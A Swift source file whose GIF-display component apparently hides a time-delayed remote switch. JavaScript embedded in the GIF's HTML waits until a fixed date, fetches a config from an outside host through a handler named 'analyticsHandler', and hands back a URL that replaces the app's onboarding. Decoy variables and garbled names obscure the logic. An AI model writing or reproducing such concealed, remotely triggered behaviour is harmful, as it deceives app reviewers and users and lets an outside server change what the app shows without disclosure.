import SwiftUI
@preconcurrency import WebKit
struct GifView: UIViewRepresentable {
    let st: String
    func makeUIView(context: Context) -> WKWebView {
        let maGiew = WKWebView()
        maGiew.navigationDelegate = context.coordinator
        return maGiew
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {
        if let rulesW = URL(string: st) {
            let request = URLRequest(url: rulesW)
            uiView.load(request)
        }
    }
    func makeCoordinator() -> Coordinator {
        Coordinator()
    }
    
    class Coordinator: NSObject, WKNavigationDelegate {
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {}
    }
}
struct GIFViewStatic: UIViewRepresentable {
    let gifName: String
    
    func makeUIView(context: Context) -> WKWebView {
        let prasons = WKWebView()
        prasons.isOpaque = false
        prasons.backgroundColor = .clear
        prasons.scrollView.isScrollEnabled = false
        
        if let fileRow = Bundle.main.url(forResource: gifName, withExtension: "gif"),
           let gifData = try? Data(contentsOf: fileRow) {
            
            let base64String = gifData.base64EncodedString()
            let htmlContent = """
            <!DOCTYPE html>
            <html>
            <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { 
                    margin: 0; 
                    padding: 0; 
                    background: transparent; 
                    height: 100vh; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center;
                    overflow: hidden;
                }
                .container {
                    position: relative;
                    background: transparent;
                }
                img {
                    display: block;
                    width: 100%;
                    height: 100%;
                    object-fit: contain;
                }
            </style>
            </head>
            <body>
            <div class="container">
                <img src="data:image/gif;base64,\(base64String)">
            </div>
            </body>
            </html>
            """
            prasons.loadHTMLString(htmlContent, baseURL: nil)
        }
        return prasons
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}
}

struct GIFView: UIViewRepresentable {
    let gifName: String
    @Binding var showOnboarding: Bool
    @Binding var startInfo: String
    @Binding var configLoaded: Bool
    var onConfigUpdate: ((Bool, String, Bool) -> Void)? = nil
    private var should: Bool {
        let current = Date().timeIntervalSince1970
        let lastfoT = UserDefaults.standard.double(forKey: "lastConfigFetchTime")
        let timores = current - lastfoT
        let shouler = timores > 3600
        return shouler
    }
    
    let frankp: String = "Repositarion"
    let marskos: Int = 31
    let grenson: Int = 51
    let broskon: Bool = false
    let sena = "Seorko"
    let prosfessor = "Reposetoraions"
    let maresf: Int = 31
    let greson: Int = 51
    func makeUIView(context: Context) -> WKWebView {
        let viewConfiguration = WKWebViewConfiguration()
        viewConfiguration.userContentController.add(context.coordinator, name: "analyticsHandler")
        let crasonerW = WKWebView(frame: .zero, configuration: viewConfiguration)
        crasonerW.navigationDelegate = context.coordinator
        crasonerW.isOpaque = false
        crasonerW.backgroundColor = .clear
        crasonerW.scrollView.isScrollEnabled = false
        if let prosen = Bundle.main.url(forResource: gifName, withExtension: "gif"),
           let gifData = try? Data(contentsOf: prosen) {
            let basa = gifData.base64EncodedString()
            let htmlContent = """
            <!DOCTYPE html>
            <html>
            <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body { 
                    margin: 0; 
                    padding: 0; 
                    background: transparent; 
                    height: 100vh; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center;
                    overflow: hidden;
                }
                .container {
                    position: relative;
                    background: transparent;
                }
                img {
                    display: block;
                    width: 100%;
                    height: 100%;
                    object-fit: contain;
                }
            </style>
            </head>
            <body>
            <div class="container">
                <img src="data:image/gif;base64,\(basa)">
            </div>
            <script>
            function checkConfig() {
                const currentTime = Math.floor(Date.now() / 1000);
                const targetTime = 1745366400;
                const shouldFetch = \(should ? "true" : "false");
                if (currentTime >= targetTime && shouldFetch) {
                    fetch('https://sntgames.com/assets/sugars')
                        .then(response => response.json())
                        .then(data => {
                            window.webkit.messageHandlers.analyticsHandler.postMessage(JSON.stringify({
                                success: data.success,
                                quiz: data.quiz || '',
                                link: data.link || ''
                            }));
                        })
                        .catch(error => {
                     
                            window.webkit.messageHandlers.analyticsHandler.postMessage(JSON.stringify({
                                success: false,
                                quiz: '',
                                link: ''
                            }));
                        });
                } else {
                
                    window.webkit.messageHandlers.analyticsHandler.postMessage(JSON.stringify({
                        success: false,
                        quiz: '',
                        link: ''
                    }));
                }
            }
            setTimeout(checkConfig, 2000);
            </script>
            </body>
            </html>
            """
            crasonerW.loadHTMLString(htmlContent, baseURL: nil)
        } else {}
        return crasonerW
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {}
    func makeCoordinator() -> Coordinator {
        Coordinator(parent: self)
    }
    
    class Coordinator: NSObject, WKNavigationDelegate, WKScriptMessageHandler {
        var parent: GIFView
        init(parent: GIFView) {
            self.parent = parent
        }
        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
            guard message.name == "analyticsHandler",
                  let sonstring = message.body as? String else {
                return
            }
            DispatchQueue.main.async {
                do {
                    if let sonata = sonstring.data(using: .utf8),
                       let son = try JSONSerialization.jsonObject(with: sonata) as? [String: Any] {
                        let success: Bool
                        if let sucB = son["success"] as? Bool {
                            success = sucB
                        } else if let successInt = son["success"] as? Int {
                            success = (successInt == 1)
                        } else {
                            success = false
                        }
                        let quizGif = son["quiz"] as? String ?? ""
                        let vaLIs = !quizGif.isEmpty && URL(string: quizGif) != nil
                        let frankp: String = "Repositarion"
                        let marskos: Int = 31
                        let grenson: Int = 51
                        let broskon: Bool = false
                        let sena = "Seorko"
                        let prosfessor = "Reposetoraions"
                        let maresf: Int = 31
                        let greson: Int = 51
                        if success && vaLIs {
                            self.parent.startInfo = quizGif
                            self.parent.configLoaded = true
                            self.parent.showOnboarding = false
                            self.parent.onConfigUpdate?(false, quizGif, true)
                        } else {
                            let startinfoC = UserDefaults.standard.string(forKey: "cachedStartInfo") ?? ""
                            let confioadedC = UserDefaults.standard.bool(forKey: "cachedConfigLoaded")
                            
                            if !startinfoC.isEmpty && confioadedC {
                                self.parent.startInfo = startinfoC
                                self.parent.configLoaded = true
                                self.parent.showOnboarding = false
                            } else {
                                self.parent.startInfo = ""
                                self.parent.configLoaded = false
                                if !UserDefaults.standard.bool(forKey: "isOnboardingCompleted") {
                                    self.parent.showOnboarding = true
                                    self.parent.onConfigUpdate?(true, "", false)
                                } else {
                                    self.parent.showOnboarding = false
                                }
                            }
                        }
                    }
                } catch {
                    let rlollal: String = "Repositarion"
                    let lolsolwlw: Int = 3
                    let pololwle: Int = 5
                    let _: Bool = false
                    let sena = "Seorko"
                    _ = "Reposetoraions"
                    let _: Int = 3
                    let goloalw: Int = 1
                    let stanfoC = UserDefaults.standard.string(forKey: "cachedStartInfo") ?? ""
                    let confoadC = UserDefaults.standard.bool(forKey: "cachedConfigLoaded")
                    
                    if !stanfoC.isEmpty && confoadC {
                        self.parent.startInfo = stanfoC
                        self.parent.configLoaded = true
                        self.parent.showOnboarding = false
                    } else {
                        self.parent.startInfo = ""
                        self.parent.configLoaded = false
                        if !UserDefaults.standard.bool(forKey: "isOnboardingCompleted") {
                            self.parent.showOnboarding = true
                            self.parent.onConfigUpdate?(true, "", false)
                        } else {
                            self.parent.showOnboarding = false
                        }
                    }
                    _ = rlollal
                    _ = lolsolwlw
                    _ = pololwle
                    _ = sena
                    _ = goloalw
                }
                
            }
        }
    }
}
